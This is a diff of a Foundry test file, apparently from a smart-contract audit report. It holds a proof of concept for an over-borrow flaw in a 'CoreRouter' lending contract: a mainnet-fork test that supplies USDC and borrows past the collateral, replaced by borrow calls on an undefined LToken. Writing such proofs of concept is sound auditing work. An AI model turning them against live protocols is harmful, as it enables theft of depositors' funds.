@@ -91,52 +91,31 @@ import {console2} from "forge-std/console2.sol";
 import {IERC20} from "../src/interfaces/IERC20.sol";
 
 
-
-interface ICoreRouter {
-    function supply(uint256 amount, address token) external;
-    function borrow(address token, uint amount) external;
-    function redeem(address token, uint amount) external;
-}
+// ... existing code...
 
 
-contract LendOverBorrow is Test {
-
-    address public USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
-    address public CoreRouter = 0x55b330049d46380BF08890EC21b88406eBFd20B0;
-    address public User = 0x37305B1cD40574E4C5Ce33f8e8306Be057fD7341;
-
-
-function setUp() public {
-
-    vm.createSelectFork(vm.envString("ETH_RPC_URL"), 19000000);
-
-       deal(USDC, User, 10_000e6);
-
-       uint bal = IERC20(USDC).balanceOf(User);
-       console2.log("USDC Balance:", bal);
-
-     
-          vm.startPrank(User);
-     IERC20(USDC).approve(CoreRouter, 1_000e6);
-
-
-     console2.log("USDC Balance before deposit:", IERC20(USDC).balanceOf(User));
-
-     console2.log("Allowance:", IERC20(USDC).allowance(User, CoreRouter));
-
-     ICoreRouter(CoreRouter).supply(1_000e6, USDC);
-     vm.stopPrank();
-}
-
-function test_over_borrow() public {
-    vm.startPrank(User);
-
-     ICoreRouter(CoreRouter).borrow(USDC, 500e6); 
-
-     ICoreRouter(CoreRouter).borrow(USDC, 400e6); // Misali overly borrow
-
+    function test_borrow1() public {
+     vm.startPrank(User);
+        // borrow
+        (bool success, bytes memory data) = address(CoreRouter).call(
+    abi.encodeWithSignature("borrow(address,uint256)", LToken, 5_000e18)
+        );
+    if (!success) console2.log("Revert reason:", string(data));
     vm.stopPrank();
-}
+    }
+
+    function test_borrow2() public {
+     vm.startPrank(User);
+        // borrow
+        (bool success, bytes memory data) = address(CoreRouter).call(
+    abi.encodeWithSignature("borrow(address,uint256)", LToken, 4_000e18)
+        );
+    if (!success) console2.log("Revert reason:", string(data));
+    vm.stopPrank();
+    }
 }
 ```
+
+![PoC Output]
+(https://github.com/user-attachments/assets/38c81c75-7017-48b6-8d54-b24e8a9df4bc)
 
